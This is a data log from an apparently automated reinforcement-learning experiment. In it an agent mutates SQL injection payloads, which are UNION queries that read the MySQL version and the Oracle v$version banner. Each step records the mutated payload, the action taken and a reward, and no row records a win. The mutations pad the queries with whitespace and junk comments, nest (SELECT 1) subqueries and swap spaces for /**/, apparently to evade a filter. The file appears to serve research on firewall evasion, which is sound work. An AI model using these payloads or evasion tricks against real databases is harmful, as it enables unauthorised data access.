;episode;step;original_payload;state;action;next_state;reward;win
109;4;20;""" select * from users where id = 1 or 1#"""". = 1 union select 1,version (  )  -- 1""";"""	 	 select	 	 *	 	 from	 	 users	 	 where	 	 id	 	 =	 	 (SELECT 1)	 	  || 	 	 (SELECT 1)	 OR	 (SELECT 0)#"""".	 	 =	 	 (SELECT 1)	 	 union	 	 select	 	 (SELECT 1),version	 	 (	 	 	 	 )	 	 	 	 --	 	 1""W";3;"""	 	 select	 	 *	 	 from	 	 users	 	 where	 	 id	 	 =	 	 (SELECT 1)	 	  || 	 	 (SELECT 1)	 OR	 (SELECT 0)#"""".	 	 =	 	 (SELECT 1)	 	 union	 	 select	 	 (SELECT 1),version	 	 (	 	 	 	 )	 	 	 	 --	 	 1""W";0.0;0
110;4;21;""" select * from users where id = 1 or 1#"""". = 1 union select 1,version (  )  -- 1""";"""	 	 select	 	 *	 	 from	 	 users	 	 where	 	 id	 	 =	 	 (SELECT 1)	 	  || 	 	 (SELECT 1)	 OR	 (SELECT 0)#"""".	 	 =	 	 (SELECT 1)	 	 union	 	 select	 	 (SELECT 1),version	 	 (	 	 	 	 )	 	 	 	 --	 	 1""W";12;"""	 	 select	 	 *	 	 from	 	 users	 	 where	 	 id	 	 =	 	 (SELECT 1)	 	  || 	 	 (SELECT 1)	 OR	 (SELECT 0)#"""".	 	 =	 	 (SELECT 1)	 	 union	 	 select	 	 (SELECT 1),version	 	 (	 	 	 	 )	 	 	 	 --	 	 1""W";0.8214285894468127;0
111;4;22;""" select * from users where id = 1 or 1#"""". = 1 union select 1,version (  )  -- 1""";"""	 	 select	 	 *	 	 from	 	 users	 	 where	 	 id	 	 =	 	 (SELECT 1)	 	  || 	 	 (SELECT 1)	 OR	 (SELECT 0)#"""".	 	 =	 	 (SELECT 1)	 	 union	 	 select	 	 (SELECT 1),version	 	 (	 	 	 	 )	 	 	 	 --	 	 1""W";14;"""	#?s{]I?
	#?s{]I?
select	#?s{]I?
	#?s{]I?
*	#?s{]I?
	#?s{]I?
from	#?s{]I?
	#?s{]I?
users	#?s{]I?
	#?s{]I?
where	#?s{]I?
	#?s{]I?
id	#?s{]I?
	#?s{]I?
=	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
1)	#?s{]I?
	#?s{]I?
#?s{]I?
||#?s{]I?
	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
1)	#?s{]I?
OR	#?s{]I?
(SELECT#?s{]I?
0)#"""".	#?s{]I?
	#?s{]I?
=	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
1)	#?s{]I?
	#?s{]I?
union	#?s{]I?
	#?s{]I?
select	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
1),version	#?s{]I?
	#?s{]I?
(	#?s{]I?
	#?s{]I?
	#?s{]I?
	#?s{]I?
)	#?s{]I?
	#?s{]I?
	#?s{]I?
	#?s{]I?
--	#?s{]I?
	#?s{]I?
1""W";7.603226086301941;0
112;4;23;""" select * from users where id = 1 or 1#"""". = 1 union select 1,version (  )  -- 1""";"""	#?s{]I?
	#?s{]I?
select	#?s{]I?
	#?s{]I?
*	#?s{]I?
	#?s{]I?
from	#?s{]I?
	#?s{]I?
users	#?s{]I?
	#?s{]I?
where	#?s{]I?
	#?s{]I?
id	#?s{]I?
	#?s{]I?
=	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
1)	#?s{]I?
	#?s{]I?
#?s{]I?
||#?s{]I?
	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
1)	#?s{]I?
OR	#?s{]I?
(SELECT#?s{]I?
0)#"""".	#?s{]I?
	#?s{]I?
=	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
1)	#?s{]I?
	#?s{]I?
union	#?s{]I?
	#?s{]I?
select	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
1),version	#?s{]I?
	#?s{]I?
(	#?s{]I?
	#?s{]I?
	#?s{]I?
	#?s{]I?
)	#?s{]I?
	#?s{]I?
	#?s{]I?
	#?s{]I?
--	#?s{]I?
	#?s{]I?
1""W";18;"""	#?s{]I?
	#?s{]I?
select	#?s{]I?
	#?s{]I?
*	#?s{]I?
	#?s{]I?
from	#?s{]I?
	#?s{]I?
users	#?s{]I?
	#?s{]I?
where	#?s{]I?
	#?s{]I?
id	#?s{]I?
	#?s{]I?
=	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
1)	#?s{]I?
	#?s{]I?
#?s{]I?
||#?s{]I?
	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
1)	#?s{]I?
OR	#?s{]I?
(SELECT#?s{]I?
0)#"""".	#?s{]I?
	#?s{]I?
=	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
1)	#?s{]I?
	#?s{]I?
union	#?s{]I?
	#?s{]I?
select	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
1),version	#?s{]I?
	#?s{]I?
(	#?s{]I?
	#?s{]I?
	#?s{]I?
	#?s{]I?
)	#?s{]I?
	#?s{]I?
	#?s{]I?
	#?s{]I?
--	#?s{]I?
	#?s{]I?
1""W";7.50322608630194;0
113;4;24;""" select * from users where id = 1 or 1#"""". = 1 union select 1,version (  )  -- 1""";"""	#?s{]I?
	#?s{]I?
select	#?s{]I?
	#?s{]I?
*	#?s{]I?
	#?s{]I?
from	#?s{]I?
	#?s{]I?
users	#?s{]I?
	#?s{]I?
where	#?s{]I?
	#?s{]I?
id	#?s{]I?
	#?s{]I?
=	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
1)	#?s{]I?
	#?s{]I?
#?s{]I?
||#?s{]I?
	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
1)	#?s{]I?
OR	#?s{]I?
(SELECT#?s{]I?
0)#"""".	#?s{]I?
	#?s{]I?
=	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
1)	#?s{]I?
	#?s{]I?
union	#?s{]I?
	#?s{]I?
select	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
1),version	#?s{]I?
	#?s{]I?
(	#?s{]I?
	#?s{]I?
	#?s{]I?
	#?s{]I?
)	#?s{]I?
	#?s{]I?
	#?s{]I?
	#?s{]I?
--	#?s{]I?
	#?s{]I?
1""W";16;"""	#?s{]I?
	#?s{]I?
select	#?s{]I?
	#?s{]I?
*	#?s{]I?
	#?s{]I?
from	#?s{]I?
	#?s{]I?
users	#?s{]I?
	#?s{]I?
where	#?s{]I?
	#?s{]I?
id	#?s{]I?
	#?s{]I?
=	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
1)	#?s{]I?
	#?s{]I?
#?s{]I?
||#?s{]I?
	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
1)	#?s{]I?
OR	#?s{]I?
(SELECT#?s{]I?
0)#"""".	#?s{]I?
	#?s{]I?
=	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
1)	#?s{]I?
	#?s{]I?
union	#?s{]I?
	#?s{]I?
select	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
1),version	#?s{]I?
	#?s{]I?
(	#?s{]I?
	#?s{]I?
	#?s{]I?
	#?s{]I?
)	#?s{]I?
	#?s{]I?
	#?s{]I?
	#?s{]I?
--	#?s{]I?
	#?s{]I?
1""W.";7.4161287426948626;0
114;4;25;""" select * from users where id = 1 or 1#"""". = 1 union select 1,version (  )  -- 1""";"""	#?s{]I?
	#?s{]I?
select	#?s{]I?
	#?s{]I?
*	#?s{]I?
	#?s{]I?
from	#?s{]I?
	#?s{]I?
users	#?s{]I?
	#?s{]I?
where	#?s{]I?
	#?s{]I?
id	#?s{]I?
	#?s{]I?
=	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
1)	#?s{]I?
	#?s{]I?
#?s{]I?
||#?s{]I?
	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
1)	#?s{]I?
OR	#?s{]I?
(SELECT#?s{]I?
0)#"""".	#?s{]I?
	#?s{]I?
=	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
1)	#?s{]I?
	#?s{]I?
union	#?s{]I?
	#?s{]I?
select	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
1),version	#?s{]I?
	#?s{]I?
(	#?s{]I?
	#?s{]I?
	#?s{]I?
	#?s{]I?
)	#?s{]I?
	#?s{]I?
	#?s{]I?
	#?s{]I?
--	#?s{]I?
	#?s{]I?
1""W.";11;"""	#?s{]I?
	#?s{]I?
select	#?s{]I?
	#?s{]I?
*	#?s{]I?
	#?s{]I?
from	#?s{]I?
	#?s{]I?
users	#?s{]I?
	#?s{]I?
where	#?s{]I?
	#?s{]I?
id	#?s{]I?
	#?s{]I?
=	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
1)	#?s{]I?
	#?s{]I?
#?s{]I?
||#?s{]I?
	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
1)	#?s{]I?
OR	#?s{]I?
(SELECT#?s{]I?
0)#"""".	#?s{]I?
	#?s{]I?
=	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
1)	#?s{]I?
	#?s{]I?
union	#?s{]I?
	#?s{]I?
select	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
1),version	#?s{]I?
	#?s{]I?
(	#?s{]I?
	#?s{]I?
	#?s{]I?
	#?s{]I?
)	#?s{]I?
	#?s{]I?
	#?s{]I?
	#?s{]I?
--	#?s{]I?
	#?s{]I?
1""W.";7.316128742694863;0
115;4;26;""" select * from users where id = 1 or 1#"""". = 1 union select 1,version (  )  -- 1""";"""	#?s{]I?
	#?s{]I?
select	#?s{]I?
	#?s{]I?
*	#?s{]I?
	#?s{]I?
from	#?s{]I?
	#?s{]I?
users	#?s{]I?
	#?s{]I?
where	#?s{]I?
	#?s{]I?
id	#?s{]I?
	#?s{]I?
=	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
1)	#?s{]I?
	#?s{]I?
#?s{]I?
||#?s{]I?
	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
1)	#?s{]I?
OR	#?s{]I?
(SELECT#?s{]I?
0)#"""".	#?s{]I?
	#?s{]I?
=	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
1)	#?s{]I?
	#?s{]I?
union	#?s{]I?
	#?s{]I?
select	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
1),version	#?s{]I?
	#?s{]I?
(	#?s{]I?
	#?s{]I?
	#?s{]I?
	#?s{]I?
)	#?s{]I?
	#?s{]I?
	#?s{]I?
	#?s{]I?
--	#?s{]I?
	#?s{]I?
1""W.";8;"""	#?s{]I?
	#?s{]I?
select	#?s{]I?
	#?s{]I?
*	#?s{]I?
	#?s{]I?
from	#?s{]I?
	#?s{]I?
users	#?s{]I?
	#?s{]I?
where	#?s{]I?
	#?s{]I?
id	#?s{]I?
	#?s{]I?
=	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
(SELECT 1))	#?s{]I?
	#?s{]I?
#?s{]I?
||#?s{]I?
	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
(SELECT 1))	#?s{]I?
OR	#?s{]I?
(SELECT#?s{]I?
(SELECT 0))#"""".	#?s{]I?
	#?s{]I?
=	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
(SELECT 1))	#?s{]I?
	#?s{]I?
union	#?s{]I?
	#?s{]I?
select	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
(SELECT 1)),version	#?s{]I?
	#?s{]I?
(	#?s{]I?
	#?s{]I?
	#?s{]I?
	#?s{]I?
)	#?s{]I?
	#?s{]I?
	#?s{]I?
	#?s{]I?
--	#?s{]I?
	#?s{]I?
1""W.";3.1999999575316913;0
116;4;27;""" select * from users where id = 1 or 1#"""". = 1 union select 1,version (  )  -- 1""";"""	#?s{]I?
	#?s{]I?
select	#?s{]I?
	#?s{]I?
*	#?s{]I?
	#?s{]I?
from	#?s{]I?
	#?s{]I?
users	#?s{]I?
	#?s{]I?
where	#?s{]I?
	#?s{]I?
id	#?s{]I?
	#?s{]I?
=	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
(SELECT 1))	#?s{]I?
	#?s{]I?
#?s{]I?
||#?s{]I?
	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
(SELECT 1))	#?s{]I?
OR	#?s{]I?
(SELECT#?s{]I?
(SELECT 0))#"""".	#?s{]I?
	#?s{]I?
=	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
(SELECT 1))	#?s{]I?
	#?s{]I?
union	#?s{]I?
	#?s{]I?
select	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
(SELECT 1)),version	#?s{]I?
	#?s{]I?
(	#?s{]I?
	#?s{]I?
	#?s{]I?
	#?s{]I?
)	#?s{]I?
	#?s{]I?
	#?s{]I?
	#?s{]I?
--	#?s{]I?
	#?s{]I?
1""W.";16;"""	#?s{]I?
	#?s{]I?
select	#?s{]I?
	#?s{]I?
*	#?s{]I?
	#?s{]I?
from	#?s{]I?
	#?s{]I?
users	#?s{]I?
	#?s{]I?
where	#?s{]I?
	#?s{]I?
id	#?s{]I?
	#?s{]I?
=	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
(SELECT 1))	#?s{]I?
	#?s{]I?
#?s{]I?
||#?s{]I?
	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
(SELECT 1))	#?s{]I?
OR	#?s{]I?
(SELECT#?s{]I?
(SELECT 0))#"""".	#?s{]I?
	#?s{]I?
=	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
(SELECT 1))	#?s{]I?
	#?s{]I?
union	#?s{]I?
	#?s{]I?
select	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
(SELECT 1)),version	#?s{]I?
	#?s{]I?
(	#?s{]I?
	#?s{]I?
	#?s{]I?
	#?s{]I?
)	#?s{]I?
	#?s{]I?
	#?s{]I?
	#?s{]I?
--	#?s{]I?
	#?s{]I?
1""W.4";3.1071426809822476;0
117;4;28;""" select * from users where id = 1 or 1#"""". = 1 union select 1,version (  )  -- 1""";"""	#?s{]I?
	#?s{]I?
select	#?s{]I?
	#?s{]I?
*	#?s{]I?
	#?s{]I?
from	#?s{]I?
	#?s{]I?
users	#?s{]I?
	#?s{]I?
where	#?s{]I?
	#?s{]I?
id	#?s{]I?
	#?s{]I?
=	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
(SELECT 1))	#?s{]I?
	#?s{]I?
#?s{]I?
||#?s{]I?
	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
(SELECT 1))	#?s{]I?
OR	#?s{]I?
(SELECT#?s{]I?
(SELECT 0))#"""".	#?s{]I?
	#?s{]I?
=	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
(SELECT 1))	#?s{]I?
	#?s{]I?
union	#?s{]I?
	#?s{]I?
select	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
(SELECT 1)),version	#?s{]I?
	#?s{]I?
(	#?s{]I?
	#?s{]I?
	#?s{]I?
	#?s{]I?
)	#?s{]I?
	#?s{]I?
	#?s{]I?
	#?s{]I?
--	#?s{]I?
	#?s{]I?
1""W.4";16;"""	#?s{]I?
	#?s{]I?
select	#?s{]I?
	#?s{]I?
*	#?s{]I?
	#?s{]I?
from	#?s{]I?
	#?s{]I?
users	#?s{]I?
	#?s{]I?
where	#?s{]I?
	#?s{]I?
id	#?s{]I?
	#?s{]I?
=	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
(SELECT 1))	#?s{]I?
	#?s{]I?
#?s{]I?
||#?s{]I?
	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
(SELECT 1))	#?s{]I?
OR	#?s{]I?
(SELECT#?s{]I?
(SELECT 0))#"""".	#?s{]I?
	#?s{]I?
=	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
(SELECT 1))	#?s{]I?
	#?s{]I?
union	#?s{]I?
	#?s{]I?
select	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
(SELECT 1)),version	#?s{]I?
	#?s{]I?
(	#?s{]I?
	#?s{]I?
	#?s{]I?
	#?s{]I?
)	#?s{]I?
	#?s{]I?
	#?s{]I?
	#?s{]I?
--	#?s{]I?
	#?s{]I?
1""W.4j";3.014285689957288;0
118;4;29;""" select * from users where id = 1 or 1#"""". = 1 union select 1,version (  )  -- 1""";"""	#?s{]I?
	#?s{]I?
select	#?s{]I?
	#?s{]I?
*	#?s{]I?
	#?s{]I?
from	#?s{]I?
	#?s{]I?
users	#?s{]I?
	#?s{]I?
where	#?s{]I?
	#?s{]I?
id	#?s{]I?
	#?s{]I?
=	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
(SELECT 1))	#?s{]I?
	#?s{]I?
#?s{]I?
||#?s{]I?
	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
(SELECT 1))	#?s{]I?
OR	#?s{]I?
(SELECT#?s{]I?
(SELECT 0))#"""".	#?s{]I?
	#?s{]I?
=	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
(SELECT 1))	#?s{]I?
	#?s{]I?
union	#?s{]I?
	#?s{]I?
select	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
(SELECT 1)),version	#?s{]I?
	#?s{]I?
(	#?s{]I?
	#?s{]I?
	#?s{]I?
	#?s{]I?
)	#?s{]I?
	#?s{]I?
	#?s{]I?
	#?s{]I?
--	#?s{]I?
	#?s{]I?
1""W.4j";18;"""	#?s{]I?
	#?s{]I?
select	#?s{]I?
	#?s{]I?
*	#?s{]I?
	#?s{]I?
from	#?s{]I?
	#?s{]I?
users	#?s{]I?
	#?s{]I?
where	#?s{]I?
	#?s{]I?
id	#?s{]I?
	#?s{]I?
=	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
(SELECT 1))	#?s{]I?
	#?s{]I?
#?s{]I?
||#?s{]I?
	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
(SELECT 1))	#?s{]I?
OR	#?s{]I?
(SELECT#?s{]I?
(SELECT 0))#"""".	#?s{]I?
	#?s{]I?
=	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
(SELECT 1))	#?s{]I?
	#?s{]I?
union	#?s{]I?
	#?s{]I?
select	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
(SELECT 1)),version	#?s{]I?
	#?s{]I?
(	#?s{]I?
	#?s{]I?
	#?s{]I?
	#?s{]I?
)	#?s{]I?
	#?s{]I?
	#?s{]I?
	#?s{]I?
--	#?s{]I?
	#?s{]I?
1""W.4j";2.9142856899572878;0
119;4;30;""" select * from users where id = 1 or 1#"""". = 1 union select 1,version (  )  -- 1""";"""	#?s{]I?
	#?s{]I?
select	#?s{]I?
	#?s{]I?
*	#?s{]I?
	#?s{]I?
from	#?s{]I?
	#?s{]I?
users	#?s{]I?
	#?s{]I?
where	#?s{]I?
	#?s{]I?
id	#?s{]I?
	#?s{]I?
=	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
(SELECT 1))	#?s{]I?
	#?s{]I?
#?s{]I?
||#?s{]I?
	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
(SELECT 1))	#?s{]I?
OR	#?s{]I?
(SELECT#?s{]I?
(SELECT 0))#"""".	#?s{]I?
	#?s{]I?
=	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
(SELECT 1))	#?s{]I?
	#?s{]I?
union	#?s{]I?
	#?s{]I?
select	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
(SELECT 1)),version	#?s{]I?
	#?s{]I?
(	#?s{]I?
	#?s{]I?
	#?s{]I?
	#?s{]I?
)	#?s{]I?
	#?s{]I?
	#?s{]I?
	#?s{]I?
--	#?s{]I?
	#?s{]I?
1""W.4j";21;"""	#?s{]I?
	#?s{]I?
select	#?s{]I?
	#?s{]I?
*	#?s{]I?
	#?s{]I?
from	#?s{]I?
	#?s{]I?
users	#?s{]I?
	#?s{]I?
where	#?s{]I?
	#?s{]I?
id	#?s{]I?
	#?s{]I?
=	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
(SELECT 1))	#?s{]I?
	#?s{]I?
#?s{]I?
||#?s{]I?
	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
(SELECT 1))	#?s{]I?
OR	#?s{]I?
(SELECT#?s{]I?
(SELECT 0))#"""".	#?s{]I?
	#?s{]I?
=	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
(SELECT 1))	#?s{]I?
	#?s{]I?
union	#?s{]I?
	#?s{]I?
select	#?s{]I?
	#?s{]I?
(SELECT#?s{]I?
(SELECT 1)),version	#?s{]I?
	#?s{]I?
(	#?s{]I?
	#?s{]I?
	#?s{]I?
	#?s{]I?
)	#?s{]I?
	#?s{]I?
	#?s{]I?
	#?s{]I?
--	#?s{]I?
	#?s{]I?
1""W.4j";2.8142856899572877;0
120;5;1;""" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1""";""" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1""";8;""" select * from users where id = (SELECT 1)   union select null,banner from v$version where rownum = (SELECT 1) -- 1""";0.6685714018150263;0
121;5;2;""" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1""";""" select * from users where id = (SELECT 1)   union select null,banner from v$version where rownum = (SELECT 1) -- 1""";15;""" select * from users where id = (SELECT 1)   union select null,banner from v$version where rownum = (SELECT 1) -- 1""";0.5685714018150263;0
122;5;3;""" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1""";""" select * from users where id = (SELECT 1)   union select null,banner from v$version where rownum = (SELECT 1) -- 1""";6;""" select * from users where id = (SELECT 1)   union select null,banner from v$version where rownum = (SELECT 1) -- 1""";0.46857140181502627;0
123;5;4;""" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1""";""" select * from users where id = (SELECT 1)   union select null,banner from v$version where rownum = (SELECT 1) -- 1""";5;""" select * from users where id = (SELECT 1)   union select null,banner from v$version where rownum = (SELECT 1) -- 1""";0.36857140181502623;0
124;5;5;""" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1""";""" select * from users where id = (SELECT 1)   union select null,banner from v$version where rownum = (SELECT 1) -- 1""";22;""" select * from users where id = (SELECT 1)   union select null,banner from v$version where rownum = (SELECT 1) -- 1""";0.26857140181502626;0
125;5;6;""" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1""";""" select * from users where id = (SELECT 1)   union select null,banner from v$version where rownum = (SELECT 1) -- 1""";6;""" select * from users where id = (SELECT 1)   union select null,banner from v$version where rownum = (SELECT 1) -- 1""";0.16857140181502628;0
126;5;7;""" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1""";""" select * from users where id = (SELECT 1)   union select null,banner from v$version where rownum = (SELECT 1) -- 1""";8;""" select * from users where id = (SELECT (SELECT 1))   union select null,banner from v$version where rownum = (SELECT (SELECT 1)) -- 1""";0.08354432133217915;0
127;5;8;""" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1""";""" select * from users where id = (SELECT (SELECT 1))   union select null,banner from v$version where rownum = (SELECT (SELECT 1)) -- 1""";12;""" select * from users where id = (SELECT (SELECT 1))   union select null,banner from v$version where rownum = (SELECT (SELECT 1)) -- 1""";0.1888889124364035;0
128;5;9;""" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1""";""" select * from users where id = (SELECT (SELECT 1))   union select null,banner from v$version where rownum = (SELECT (SELECT 1)) -- 1""";0;"""/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/(SELECT/**/(SELECT/**/1))/**//**//**/union/**/select/**/null,banner/**/from/**/v$version/**/where/**/rownum/**/=/**/(SELECT/**/(SELECT/**/1))/**/--/**/1""";0.2681818094997368;0
129;5;10;""" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1""";"""/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/(SELECT/**/(SELECT/**/1))/**//**//**/union/**/select/**/null,banner/**/from/**/v$version/**/where/**/rownum/**/=/**/(SELECT/**/(SELECT/**/1))/**/--/**/1""";17;"""/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/(SELECT/**/(SELECT/**/1))/**//**//**/union/**/select/**/null,banner/**/from/**/v$version/**/where/**/rownum/**/=/**/(SELECT/**/(SELECT/**/1))/**/--/**/1""";0.16818180949973682;0
130;5;11;""" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1""";"""/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/(SELECT/**/(SELECT/**/1))/**//**//**/union/**/select/**/null,banner/**/from/**/v$version/**/where/**/rownum/**/=/**/(SELECT/**/(SELECT/**/1))/**/--/**/1""";20;"""/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/(SELECT/**/(SELECT/**/1))/**//**//**/union/**/select/**/null,banner/**/from/**/v$version/**/where/**/rownum/**/=/**/(SELECT/**/(SELECT/**/1))/**/--/**/1""";0.06818180949973685;0
131;5;12;""" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1""";"""/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/(SELECT/**/(SELECT/**/1))/**//**//**/union/**/select/**/null,banner/**/from/**/v$version/**/where/**/rownum/**/=/**/(SELECT/**/(SELECT/**/1))/**/--/**/1""";8;"""/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/(SELECT/**/(SELECT/**/(SELECT 1)))/**//**//**/union/**/select/**/null,banner/**/from/**/v$version/**/where/**/rownum/**/=/**/(SELECT/**/(SELECT/**/(SELECT 1)))/**/--/**/1""";0.0;0
132;5;13;""" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1""";"""/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/(SELECT/**/(SELECT/**/(SELECT 1)))/**//**//**/union/**/select/**/null,banner/**/from/**/v$version/**/where/**/rownum/**/=/**/(SELECT/**/(SELECT/**/(SELECT 1)))/**/--/**/1""";16;"""/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/(SELECT/**/(SELECT/**/(SELECT 1)))/**//**//**/union/**/select/**/null,banner/**/from/**/v$version/**/where/**/rownum/**/=/**/(SELECT/**/(SELECT/**/(SELECT 1)))/**/--/**/1""";0.0;0
133;5;14;""" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1""";"""/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/(SELECT/**/(SELECT/**/(SELECT 1)))/**//**//**/union/**/select/**/null,banner/**/from/**/v$version/**/where/**/rownum/**/=/**/(SELECT/**/(SELECT/**/(SELECT 1)))/**/--/**/1""";18;"""/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/(SELECT/**/(SELECT/**/(SELECT 1)))/**//**//**/union/**/select/**/null,banner/**/from/**/v$version/**/where/**/rownum/**/=/**/(SELECT/**/(SELECT/**/(SELECT 1)))/**/--/**/1""";0.0;0
134;5;15;""" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1""";"""/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/(SELECT/**/(SELECT/**/(SELECT 1)))/**//**//**/union/**/select/**/null,banner/**/from/**/v$version/**/where/**/rownum/**/=/**/(SELECT/**/(SELECT/**/(SELECT 1)))/**/--/**/1""";18;"""/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/(SELECT/**/(SELECT/**/(SELECT 1)))/**//**//**/union/**/select/**/null,banner/**/from/**/v$version/**/where/**/rownum/**/=/**/(SELECT/**/(SELECT/**/(SELECT 1)))/**/--/**/1""";0.0;0
